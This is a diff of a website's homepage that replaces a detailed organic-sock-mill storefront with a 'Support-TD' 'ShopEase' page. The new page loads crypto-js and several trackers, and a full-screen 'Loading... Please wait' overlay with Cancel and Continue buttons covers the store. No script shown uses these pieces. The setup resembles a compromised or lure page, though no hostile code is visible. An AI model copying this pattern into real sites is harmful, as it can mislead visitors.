@@ -1,665 +1,312 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=Playfair+Display:ital,wght@0,500;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css">
-    <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-  gtag('config', 'G-0LY0HY7L01');
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
 </script>
 
-    <title>CottonKnitPod | Artisanal Organic Cotton Socks, Seamless Toe Knitting & Anatomical Comfort</title>
-    <meta name="description" content="Discover CottonKnitPod: Master-crafted organic combed cotton socks, hand-linked seamless toes, anatomical Y-heel engineering, and breathable 200-needle circular knitting.">
+
 </head>
 <body>
-    <div class="reading-progress-bar" id="readingProgress"></div>
 
-    <!-- Global Header -->
-    <header class="site-header">
-        <div class="header-container">
-            <a href="index.html" class="brand-logo">
-                <div class="logo-badge">C</div>
-                <div class="logo-text-group">
-                    <span class="logo-title">COTTON KNIT POD</span>
-                    <span class="logo-sub">Artisanal Sock Mill</span>
-                </div>
-            </a>
-            <nav class="main-nav" id="mainNav">
-                <ul class="nav-links">
-                    <li><a href="index.html" class="nav-link active">Mill Home</a></li>
-                    <li><a href="about.html" class="nav-link ">Our Craft & Mill</a></li>
-                    <li><a href="blog.html" class="nav-link ">Knitwear Gazette</a></li>
-                    <li><a href="contact.html" class="nav-link ">Concierge & Desk</a></li>
-                </ul>
-            </nav>
-            <div class="header-actions">
-                <button class="theme-toggle-btn" id="themeToggle" aria-label="Toggle Night/Day Mode">
-                    <span id="themeIcon">🌓</span>
-                </button>
-                <a href="contact.html" class="btn-mill-direct">Direct Dispatch</a>
-                <button class="mobile-menu-toggle" id="mobileMenuToggle" aria-label="Open Navigation">
-                    <span></span>
-                    <span></span>
-                    <span></span>
-                </button>
-            </div>
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
     </header>
 
-
-    <!-- SECTION 1: HERO SECTION -->
-    <section class="hero-section">
-        <div class="hero-overlay"></div>
-        <div class="hero-content">
-            <div class="hero-badge">Anatomical Knitcraft & Organic Fiber Science</div>
-            <h1 class="hero-title">The Perfect Knit For Every Step You Take</h1>
-            <p class="hero-subtitle">
-                Engineered from 100% GOTS certified long-staple combed cotton on precision double-cylinder circular knitting machines, featuring hand-linked seamless toe closures and ergonomic arch support bands.
-            </p>
-            <div class="hero-cta-group">
-                <a href="#architect" class="btn-primary-terracotta">Custom Pod Knitter</a>
-                <a href="about.html" class="btn-secondary-outline">Discover Mill Heritage</a>
-            </div>
-            <div class="hero-stats">
-                <div class="stat-card">
-                    <span class="stat-num">200</span>
-                    <span class="stat-label">Needle Density</span>
-                </div>
-                <div class="stat-card">
-                    <span class="stat-num">100%</span>
-                    <span class="stat-label">Seamless Linked Toes</span>
-                </div>
-                <div class="stat-card">
-                    <span class="stat-num">GOTS</span>
-                    <span class="stat-label">Certified Organic Cotton</span>
-                </div>
-                <div class="stat-card">
-                    <span class="stat-num">Zero</span>
-                    <span class="stat-label">Microplastic Shedding</span>
-                </div>
-            </div>
-        </div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
     </section>
 
-    <!-- SECTION 2: THE POD YARN & FIBER SCIENCE MATRIX -->
-    <section class="fiber-matrix-section section-padding">
-        <div class="section-container">
-            <div class="section-header-center">
-                <span class="section-eyebrow">Natural Fiber Science</span>
-                <h2 class="section-title">The Four Fundamental Yarns of CottonKnitPod</h2>
-                <p class="section-subtitle">A botanical and mechanical study of our staple fibers, carding methods, and natural spin physics.</p>
-            </div>
-            <div class="fiber-matrix-grid">
-                <div class="fiber-card">
-                    <span class="fiber-icon">🌱</span>
-                    <h3>GOTS Long-Staple Combed Cotton</h3>
-                    <div class="fiber-spec">38mm Staple Length • Ring-Spun 40s/2</div>
-                    <p>Sourced from organic fields without synthetic pesticides. Combed to remove short brittle fibers, delivering high tensile strength, supreme breathability, and natural anti-pilling longevity.</p>
-                </div>
-                <div class="fiber-card">
-                    <span class="fiber-icon">🌿</span>
-                    <h3>Botanical-Dyed Organic Slub</h3>
-                    <div class="fiber-spec">Natural Indigo, Madder & Walnut</div>
-                    <p>Colored using low-impact closed-loop vegetable vat dyeing. Imparts organic earthy hues that develop a subtle, unique patina over years of washing without heavy-metal runoff.</p>
-                </div>
-                <div class="fiber-card">
-                    <span class="fiber-icon">🐑</span>
-                    <h3>Merino-Cotton Hybrid Spun Yarn</h3>
-                    <div class="fiber-spec">19.5 Micron Merino • 55/45 Blend</div>
-                    <p>Combines the moisture-wicking and thermal regulation of fine Australian merino wool with the structural softness and wash durability of organic cotton for cold-weather hikes.</p>
-                </div>
-                <div class="fiber-card">
-                    <span class="fiber-icon">♻️</span>
-                    <h3>Closed-Loop Recycled Combed Yarn</h3>
-                    <div class="fiber-spec">Post-Industrial Pre-Consumer Cotton</div>
-                    <p>Regenerated from clean garment cutting waste blended with virgin organic fibers. Conserves millions of liters of fresh water while providing dense terry-loop cushioning underfoot.</p>
-                </div>
-            </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
     </section>
 
-    <!-- SECTION 3: INTERACTIVE SOCK ARCHITECT (POD KNITTER) -->
-    <section id="architect" class="architect-section section-padding bg-creme">
-        <div class="section-container">
-            <div class="section-header-center">
-                <span class="section-eyebrow">Interactive Bespoke Atelier</span>
-                <h2 class="section-title">The Sock Architect (Pod Knitter)</h2>
-                <p class="section-subtitle">Customize your custom sock silhouette, needle gauge, yarn palette, and targeted cushion zones in real time.</p>
-            </div>
-            <div class="architect-container">
-                <div class="architect-preview-panel">
-                    <div class="preview-stage">
-                        <div class="sock-canvas-mockup">
-                            <div class="sock-frame">
-                                <div class="sock-cuff" id="sockCuff"></div>
-                                <div class="sock-leg" id="sockLeg">
-                                    <div class="sock-rib-lines"></div>
-                                </div>
-                                <div class="sock-foot-wrap">
-                                    <div class="sock-heel" id="sockHeel"></div>
-                                    <div class="sock-foot" id="sockFoot">
-                                        <div class="sock-arch-band"></div>
-                                        <div class="sock-toe" id="sockToe"></div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="architect-live-summary">
-                            <h4 id="architectSockName">The Essential Crew Pod</h4>
-                            <p id="architectSockSpec">Indigo Slate & Copper • 168-Needle Fine Rib • Targeted Terry Cushion</p>
-                            <div class="architect-needle-badge" id="needleCountBadge">168 Needles</div>
-                        </div>
-                    </div>
-                </div>
-                <div class="architect-controls-panel">
-                    <!-- Step 1: Silhouette Cut -->
-                    <div class="control-group">
-                        <label class="control-label">1. Select Silhouette & Height</label>
-                        <div class="option-selectors" id="cutOptions">
-                            <button class="selector-btn active" data-cut="crew" data-name="The Essential Crew Pod">Classic Crew</button>
-                            <button class="selector-btn" data-cut="ankle" data-name="The Low-Cut Trainer Pod">Low-Cut Ankle</button>
-                            <button class="selector-btn" data-cut="quarter" data-name="The Mid-Quarter Runner">Quarter Trail</button>
-                        </div>
-                    </div>
-
-                    <!-- Step 2: Yarn Color Palette -->
-                    <div class="control-group">
-                        <label class="control-label">2. Select Yarn Color Palette</label>
-                        <div class="swatch-grid" id="paletteOptions">
-                            <button class="swatch-btn active" data-color="#1e3a5f" data-accent="#c86d51" data-palette="Indigo Slate & Copper">
-                                <span class="swatch-circle" style="background-color: #1e3a5f; border: 2px solid #c86d51;"></span>
-                                <span class="swatch-text">Indigo & Copper</span>
-                            </button>
-                            <button class="swatch-btn" data-color="#3b5e4f" data-accent="#e8d5b5" data-palette="Botanical Sage & Oat">
-                                <span class="swatch-circle" style="background-color: #3b5e4f; border: 2px solid #e8d5b5;"></span>
-                                <span class="swatch-text">Sage & Oat Cream</span>
-                            </button>
-                            <button class="swatch-btn" data-color="#c86d51" data-accent="#1e3a5f" data-palette="Terracotta & Denim">
-                                <span class="swatch-circle" style="background-color: #c86d51; border: 2px solid #1e3a5f;"></span>
-                                <span class="swatch-text">Terracotta Amber</span>
-                            </button>
-                            <button class="swatch-btn" data-color="#181d1c" data-accent="#3b5e4f" data-palette="Charcoal Heather Noir">
-                                <span class="swatch-circle" style="background-color: #181d1c; border: 2px solid #3b5e4f;"></span>
-                                <span class="swatch-text">Charcoal Heather</span>
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Step 3: Cylinder Needle Gauge -->
-                    <div class="control-group">
-                        <label class="control-label">3. Circular Cylinder Gauge</label>
-                        <div class="option-selectors" id="gaugeOptions">
-                            <button class="selector-btn active" data-gauge="168-Needle Fine Rib" data-needles="168 Needles">168-Needle Rib</button>
-                            <button class="selector-btn" data-gauge="200-Needle Dress Fine" data-needles="200 Needles">200-Needle Dress</button>
-                            <button class="selector-btn" data-gauge="96-Needle Chunky Waffle" data-needles="96 Needles">96-Needle Waffle</button>
-                        </div>
-                    </div>
-
-                    <!-- Step 4: Cushion Profile -->
-                    <div class="control-group">
-                        <label class="control-label">4. Ergonomic Cushion Density</label>
-                        <div class="option-selectors" id="cushionOptions">
-                            <button class="selector-btn active" data-cushion="Targeted Terry Cushion">Targeted Terry</button>
-                            <button class="selector-btn" data-cushion="Zero-Bulk Featherweight">Zero-Bulk Ultra</button>
-                            <button class="selector-btn" data-cushion="Full Footbed Heavy Cushion">Full Footbed</button>
-                        </div>
-                    </div>
-
-                    <div class="architect-action-box">
-                        <a href="contact.html" class="btn-primary-terracotta btn-block">Reserve Mill Dispatch Batch</a>
-                    </div>
-                </div>
-            </div>
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
     </section>
 
-    <!-- SECTION 4: THE 6 PILLARS OF ANATOMICAL KNITCRAFT -->
-    <section class="pillars-section section-padding">
-        <div class="section-container">
-            <div class="section-header-center">
-                <span class="section-eyebrow">Engineering Excellence</span>
-                <h2 class="section-title">The Six Pillars of CottonKnitPod Anatomical Craft</h2>
-                <p class="section-subtitle">Every pair of socks is engineered with structural features designed for zero friction, maximum breathability, and non-slip longevity.</p>
-            </div>
-            <div class="pillars-grid-6">
-                <div class="pillar-card">
-                    <div class="pillar-num">01</div>
-                    <h3 class="pillar-title">Hand-Linked Seamless Toe</h3>
-                    <p class="pillar-desc">
-                        Rather than using rigid overlock stitches that create uncomfortable raised ridges, our toe seams are linked loop-by-loop with fine nylon thread for a completely smooth, friction-free interior.
-                    </p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-num">02</div>
-                    <h3 class="pillar-title">Deep Y-Gore Heel Pocket</h3>
-                    <p class="pillar-desc">
-                        A triple-stitched Y-shaped gore knitted into the calcaneus cup anchors the heel in place, completely eliminating bunching, sliding, and heel drop during active movement.
-                    </p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-num">03</div>
-                    <h3 class="pillar-title">360° Dynamic Arch Support</h3>
-                    <p class="pillar-desc">
-                        A ribbed elastic tension band gently hugs the plantar fascia, preventing plantar fatigue, keeping the sock aligned with the arch contour, and stabilizing midfoot mechanics.
-                    </p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-num">04</div>
-                    <h3 class="pillar-title">Honeycomb Dorsal Mesh</h3>
-                    <p class="pillar-desc">
-                        Integrated open-knit hexagonal channels over the instep promote rapid air circulation and vapor venting, preventing moisture accumulation inside footwear.
-                    </p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-num">05</div>
-                    <h3 class="pillar-title">Targeted Terry Loop Cushioning</h3>
-                    <p class="pillar-desc">
-                        Dense micro-terry loops woven under the metatarsal head and heel absorb ground impact shock without adding unnecessary bulk to dress shoe or sneaker fit.
-                    </p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-num">06</div>
-                    <h3 class="pillar-title">Silicone-Free Stay-Up Welt</h3>
-                    <p class="pillar-desc">
-                        Engineered with graduated elastic tension along the cuff that stays up all day without pinching circulation or requiring allergenic rubber grips.
-                    </p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- SECTION 5: GAUGE & CUSHION TECHNICAL TABLE -->
-    <section class="gauge-table-section section-padding bg-noir text-ivory">
-        <div class="section-container">
-            <div class="section-header-center">
-                <span class="section-eyebrow text-accent">Technical Specifications</span>
-                <h2 class="section-title text-light">Needle Gauge & Fabric Weight Matrix</h2>
-                <p class="section-subtitle text-muted">A comparative engineering breakdown of our circular knitting gauges, yarn counts, and optimal footwear pairings.</p>
-            </div>
-            <div class="technical-table-wrap">
-                <table class="technical-table">
-                    <thead>
-                        <tr>
-                            <th>Needle Cylinder Gauge</th>
-                            <th>Yarn Count & Ply</th>
-                            <th>Fabric GSM</th>
-                            <th>Cushion Density</th>
-                            <th>Optimal Footwear Application</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr>
-                            <td><strong>200-Needle Ultra-Fine</strong></td>
-                            <td>Ne 40/2 Combed Ring-Spun</td>
-                            <td>120 – 140 GSM</td>
-                            <td>Zero-Bulk Featherweight</td>
-                            <td>Formal Oxford Shoes, Italian Loafers, Chelsea Boots</td>
-                        </tr>
-                        <tr>
-                            <td><strong>168-Needle Classic Rib</strong></td>
-                            <td>Ne 32/2 Organic Combed Cotton</td>
-                            <td>160 – 185 GSM</td>
-                            <td>Targeted Metatarsal Terry</td>
-                            <td>Casual Sneakers, Low-Top Court Shoes, Everyday Chukkas</td>
-                        </tr>
-                        <tr>
-                            <td><strong>144-Needle Athletic Trail</strong></td>
-                            <td>Ne 24/2 Cotton-Merino Blend</td>
-                            <td>210 – 240 GSM</td>
-                            <td>High-Density Heel & Toe Shield</td>
-                            <td>Trail Running Shoes, Hiking Trainers, Cross-Fit Footwear</td>
-                        </tr>
-                        <tr>
-                            <td><strong>96-Needle Chunky Waffle</strong></td>
-                            <td>Ne 16/3 Heavy Slub Cotton</td>
-                            <td>290 – 330 GSM</td>
-                            <td>Full Thermal Waffle Bed</td>
-                            <td>Heavy Winter Boots, Work Boots, Fireside Lounging</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-    </section>
-
-    <!-- SECTION 6: SEASONAL SOCK CAPSULE HARMONIZER -->
-    <section class="harmonizer-section section-padding">
-        <div class="section-container">
-            <div class="section-header-center">
-                <span class="section-eyebrow">The Wardrobe Capsule</span>
-                <h2 class="section-title">Seasonal Footwear & Knitwear Harmonizer</h2>
-                <p class="section-subtitle">Coordinate your sock height, fiber blend, and gauge to match seasonal weather transitions and shoe rotation.</p>
-            </div>
-            <div class="harmonizer-tabs">
-                <button class="season-tab active" data-season="spring">Spring Vernal Rib</button>
-                <button class="season-tab" data-season="summer">Summer Riviera Low-Cut</button>
-                <button class="season-tab" data-season="autumn">Autumn Woodland Blend</button>
-                <button class="season-tab" data-season="winter">Winter Alpine Thermal</button>
-            </div>
-            <div class="harmonizer-content-card">
-                <div class="harmonizer-grid">
-                    <div class="harmonizer-img-col">
-                        <img id="harmonizerImg" src="images/ribbed-crew-cotton-socks.jpg" alt="Spring Vernal Rib Cotton Socks" class="rounded-knit-img">
-                    </div>
-                    <div class="harmonizer-text-col">
-                        <span class="harmonizer-tag" id="harmonizerTag">Spring Vernal Capsule • March - May</span>
-                        <h3 class="harmonizer-title" id="harmonizerTitle">The Botanical Sage Ribbed Crew</h3>
-                        <p class="harmonizer-desc" id="harmonizerDesc">
-                            Engineered for transition seasons. Woven from 100% GOTS certified long-staple organic cotton with low-tension welt bands and seamless hand-linked toe seams.
-                        </p>
-                        <div class="harmonizer-specs">
-                            <div class="spec-row">
-                                <strong>Recommended Cut & Gauge:</strong> <span id="harmonizerCut">Mid-Calf Ribbed Crew (168-Needle Gauge)</span>
-                            </div>
-                            <div class="spec-row">
-                                <strong>Fiber Blend:</strong> <span id="harmonizerFiber">85% Organic Combed Cotton, 13% Recycled Polyamide, 2% Elastane</span>
-                            </div>
-                            <div class="spec-row">
-                                <strong>Harmonizing Footwear:</strong> <span id="harmonizerFootwear">Canvas Sneakers, Suede Loafers, Minimalist Trainers</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- SECTION 7: MILL ARCHIVE & GALLERY SHOWCASE -->
-    <section class="gallery-showcase section-padding bg-creme">
-        <div class="section-container">
-            <div class="section-header-center">
-                <span class="section-eyebrow">Knitting Mill In Action</span>
-                <h2 class="section-title">Master Craftsmen, Circular Cylinders & Hand Linking</h2>
-                <p class="section-subtitle">A behind-the-scenes glimpse into our specialized circular knitting machines, yarn cone libraries, and finishing processes.</p>
-            </div>
-            <div class="gallery-showcase-grid">
-                <div class="gallery-showcase-card">
-                    <div class="gallery-img-wrap">
-                        <img src="images/knitting-machine-cylinder-needles.jpg" alt="Circular knitting machine cylinder needles">
-                    </div>
-                    <div class="gallery-card-content">
-                        <h4>Precision Cylinder Needles</h4>
-                        <p>High-speed rotating cams delivering micro-tension yarn feed with zero snagging or irregular loops.</p>
-                    </div>
-                </div>
-                <div class="gallery-showcase-card">
-                    <div class="gallery-img-wrap">
-                        <img src="images/organic-cotton-yarn-cones.jpg" alt="Organic cotton yarn cones on workshop shelves">
-                    </div>
-                    <div class="gallery-card-content">
-                        <h4>Certified Organic Cones</h4>
-                        <p>Pure ring-spun organic cotton waiting for double-feed cylinder creels in our temperature-controlled yarn room.</p>
-                    </div>
-                </div>
-                <div class="gallery-showcase-card">
-                    <div class="gallery-img-wrap">
-                        <img src="images/hand-linked-seamless-toe-detail.jpg" alt="Hand-linked seamless toe craftsmanship detail">
-                    </div>
-                    <div class="gallery-card-content">
-                        <h4>Hand-Linked Toe Linking</h4>
-                        <p>Our skilled operators inspect every individual toe point on circular linking dials for a flat finish.</p>
-                    </div>
-                </div>
-                <div class="gallery-showcase-card">
-                    <div class="gallery-img-wrap">
-                        <img src="images/botanical-dyeing-cotton-hanks.jpg" alt="Botanical dyeing cotton hanks with natural pigments">
-                    </div>
-                    <div class="gallery-card-content">
-                        <h4>Botanical Pigment Baths</h4>
-                        <p>Plant-extracted natural dyes derived from indigo leaves, madder roots, and oak galls for soft colors.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- SECTION 8: PODIATRIC SCIENCE & FOOT ERGONOMICS -->
-    <section class="podiatry-section section-padding">
-        <div class="section-container">
-            <div class="podiatry-grid">
-                <div class="podiatry-text-col">
-                    <span class="section-eyebrow">Foot Health & Ergonomics</span>
-                    <h2 class="section-title">Engineered to Support Natural Human Locomotion</h2>
-                    <p class="lead-text">
-                        The human foot contains 26 bones, 33 joints, and over 100 tendons and ligaments that endure hundreds of tons of cumulative impact force every single day.
-                    </p>
-                    <p class="body-text">
-                        Conventional synthetic socks trap perspiration against the skin, causing epidermal maceration, bacterial odor proliferation, and blister-causing friction points. CottonKnitPod solves these mechanical vulnerabilities by combining natural moisture-wicking organic cellulose fibers with anatomically mapped pressure zones.
-                    </p>
-                    <div class="podiatry-points">
-                        <div class="point-item">
-                            <span class="point-icon">✓</span>
-                            <div class="point-desc">
-                                <strong>Zero Blister Friction:</strong> Seamless toe linking eliminates the transverse seam ridge that rubs against toenails and distal phalanges.
-                            </div>
-                        </div>
-                        <div class="point-item">
-                            <span class="point-icon">✓</span>
-                            <div class="point-desc">
-                                <strong>Plantar Shock Dissipation:</strong> High-density terry loops distribute vertical ground reaction forces evenly across the heel strike.
-                            </div>
-                        </div>
-                        <div class="point-item">
-                            <span class="point-icon">✓</span>
-                            <div class="point-desc">
-                                <strong>Moisture Micro-Ventilation:</strong> Natural cotton capillary channels draw sweat away from sweat glands to evaporate rapidly through dorsal mesh vents.
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="podiatry-img-col">
-                    <img src="images/compression-arch-support-sock.jpg" alt="Podiatric arch support and ergonomic sock construction" class="rounded-knit-img shadow-knit">
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- SECTION 9: CARE & LONGEVITY PROTOCOL -->
-    <section class="care-protocol-section section-padding bg-creme">
-        <div class="section-container">
-            <div class="section-header-center">
-                <span class="section-eyebrow">Fiber Longevity</span>
-                <h2 class="section-title">The Four-Step Organic Sock Care Protocol</h2>
-                <p class="section-subtitle">How to preserve the elasticity, softness, and hand-linked seams of your cotton socks for years of daily wear.</p>
-            </div>
-            <div class="care-protocol-grid">
-                <div class="care-card">
-                    <div class="care-step-badge">01</div>
-                    <h3>Wash Inside Out</h3>
-                    <p>Turning socks inside out before washing protects the outer knit surface from friction while allowing detergent to thoroughly cleanse perspiration from inner terry loops.</p>
-                </div>
-                <div class="care-card">
